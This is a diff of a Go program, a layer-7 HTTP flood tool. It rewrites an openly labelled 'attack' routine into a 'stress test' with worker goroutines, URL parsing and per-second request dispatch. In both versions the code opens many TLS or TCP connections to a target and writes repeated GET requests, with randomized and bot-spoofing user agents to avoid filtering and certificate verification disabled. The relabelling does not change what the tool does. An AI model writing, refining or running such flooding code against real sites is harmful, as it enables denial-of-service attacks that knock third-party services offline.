@@ -5,37 +5,20 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
+	"net/url"
 	"os"
 	"strconv"
+	"sync"
 	"time"
 )
 
 var (
-	ip        = "test.com"
-	s_port    = "443"
-	port      = 443
-	threads   = 0
-	path      = "/"
-	timer     = 0
-	rpath     = false
-	a_z       = []string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}
-	acceptall = []string{
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-		"Accept-Encoding: gzip, deflate\r\n",
-		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
-		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xhtml+xml",
-		"Accept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
-		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-	}
+	ip      string
+	port    int
+	path    string
+	threads int
+	timer   int
+
 	choice  = []string{"Macintosh", "Windows", "X11"}
 	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
 	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
@@ -51,6 +34,12 @@ var (
 		"Googlebot-News",
 		"Googlebot-Video/1.0",
 	}
+	acceptHeaders = []string{
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+		"Accept-Encoding: gzip, deflate",
+		"Accept-Language: en-US,en;q=0.5",
+		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+	}
 )
 
 func init() {
@@ -61,103 +50,125 @@ func getuseragent() string {
 	platform := choice[rand.Intn(len(choice))]
 	var os string
 	if platform == "Macintosh" {
-		os = choice2[rand.Intn(len(choice2)-1)]
+		os = choice2[rand.Intn(len(choice2))]
 	} else if platform == "Windows" {
-		os = choice3[rand.Intn(len(choice3)-1)]
+		os = choice3[rand.Intn(len(choice3))]
 	} else if platform == "X11" {
-		os = choice4[rand.Intn(len(choice4)-1)]
+		os = choice4[rand.Intn(len(choice4))]
 	}
-	browser := choice5[rand.Intn(len(choice5)-1)]
+	browser := choice5[rand.Intn(len(choice5))]
 	if browser == "chrome" {
 		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
-		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
-		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
+		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
+		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s.0 (KHTML, like Gecko) Chrome/%s Safari/%s", os, webkit, version, webkit)
 	} else if browser == "ie" {
-		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
-		engine := strconv.Itoa(rand.Intn(99)) + ".0"
-		option := rand.Intn(1)
-		var token string
-		if option == 1 {
-			token = choice6[rand.Intn(len(choice6)-1)] + "; "
-		} else {
-			token = ""
+		version := fmt.Sprintf("%d.0", rand.Intn(99))
+		engine := fmt.Sprintf("%d.0", rand.Intn(99))
+		token := ""
+		if rand.Intn(2) == 1 {
+			token = choice6[rand.Intn(len(choice6))] + "; "
 		}
-		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
+		return fmt.Sprintf("Mozilla/5.0 (compatible; MSIE %s; %s; %sTrident/%s)", version, os, token, engine)
 	}
 	return spider[rand.Intn(len(spider))]
 }
 
-func getheader() string {
-	connection := "Connection: keep-alive\r\n"
-	accept := acceptall[rand.Intn(len(acceptall))]
-	referer := "Referer: " + "https://" + ip + "/" + "\r\n"
-	useragent := "User-Agent: " + getuseragent() + "\r\n"
-	header := connection + useragent + accept + referer + "\r\n"
+func getHeader() string {
+	header := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
+	header += fmt.Sprintf("Host: %s\r\n", ip)
+	header += fmt.Sprintf("User-Agent: %s\r\n", getuseragent())
+	header += fmt.Sprintf("%s\r\n", acceptHeaders[rand.Intn(len(acceptHeaders))])
+	header += "Connection: keep-alive\r\n\r\n"
 	return header
 }
 
-func attack() {
-	var s net.Conn
-	var err error
-	header := getheader()
-	for {
-		if rpath == true {
-			path = "/" + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + ".php"
-		}
-		get_host := "GET " + path + " HTTP/1.1\r\nHost: " + ip + ":" + strconv.Itoa(port) + "\r\n"
-		request := get_host + header
-		addr := ip + ":" + strconv.Itoa(port)
+func worker(id int, wg *sync.WaitGroup, requestCount chan int) {
+	defer wg.Done()
+
+	tlsConfig := &tls.Config{InsecureSkipVerify: true}
+	address := fmt.Sprintf("%s:%d", ip, port)
+
+	for count := range requestCount {
+		var conn net.Conn
+		var err error
+
 		if port == 443 {
-			cfg := &tls.Config{
-				InsecureSkipVerify: true,
-				ServerName:         ip, //simple fix
-			}
-			s, err = tls.Dial("tcp", addr, cfg)
+			conn, err = tls.Dial("tcp", address, tlsConfig)
 		} else {
-			s, err = net.Dial("tcp", addr)
+			conn, err = net.Dial("tcp", address)
 		}
+
 		if err != nil {
-			fmt.Println("Connection Down!!!")
-		} else {
-			for i := 0; i < 100; i++ {
-				s.Write([]byte(request))
-			}
-			s.Close()
+			fmt.Printf("Worker %d: connection error: %v\n", id, err)
+			continue
 		}
+
+		header := getHeader()
+		for i := 0; i < count; i++ {
+			_, err := conn.Write([]byte(header))
+			if err != nil {
+				fmt.Printf("Worker %d: write error: %v\n", id, err)
+				break
+			}
+		}
+		conn.Close()
 	}
 }
 
 func main() {
-	ip = os.Args[1]
-	s_port := os.Args[2]
-	cport, err := strconv.Atoi(s_port)
+	if len(os.Args) < 4 {
+		fmt.Println("Usage: <URL> <THREADS> <TIMER>")
+		return
+	}
+
+	// Parse URL and determine port and path
+	parsedURL, err := url.Parse(os.Args[1])
 	if err != nil {
-		fmt.Println("Convertion Error!")
+		fmt.Println("Invalid URL:", err)
+		return
 	}
-	port = cport
-	path = os.Args[3]
-	if path == "t" {
-		rpath = true
+
+	ip = parsedURL.Hostname()
+	if parsedURL.Port() != "" {
+		port, _ = strconv.Atoi(parsedURL.Port())
+	} else if parsedURL.Scheme == "https" {
+		port = 443
+	} else {
+		port = 80
 	}
-	if path == "T" {
-		rpath = true
+
+	path = parsedURL.Path
+	if path == "" {
+		path = "/"
 	}
-	s_threads := os.Args[4]
-	cthreads, err := strconv.Atoi(s_threads)
-	if err != nil {
-		fmt.Println("Convertion Error!")
-	}
-	threads = cthreads
-	s_timer := os.Args[5]
-	ctimer, err := strconv.Atoi(s_timer)
-	if err != nil {
-		fmt.Println("Convertion Error!")
-	}
-	timer = ctimer
-	fmt.Println("ATTACK STARTED WITH " + s_threads + "THREADS")
+
+	threads, _ = strconv.Atoi(os.Args[2])
+	timer, _ = strconv.Atoi(os.Args[3])
+
+	fmt.Printf("Starting stress test on %s:%d%s with %d threads for %d seconds\n", ip, port, path, threads, timer)
+
+	var wg sync.WaitGroup
+	requestCount := make(chan int, threads)
+
 	for i := 0; i < threads; i++ {
-		time.Sleep(time.Microsecond * 100)
-		go attack()
+		wg.Add(1)
+		go worker(i, &wg, requestCount)
 	}
-	time.Sleep(time.Duration(timer) * time.Second)
+
+	// Dispatch requests to workers
+	go func() {
+		ticker := time.NewTicker(1 * time.Second)
+		defer ticker.Stop()
+
+		for t := 0; t < timer; t++ {
+			<-ticker.C
+			for i := 0; i < threads; i++ {
+				requestCount <- 200 // Adjust per thread load here
+			}
+		}
+		close(requestCount)
+	}()
+
+	wg.Wait()
+	fmt.Println("Stress test completed.")
 }
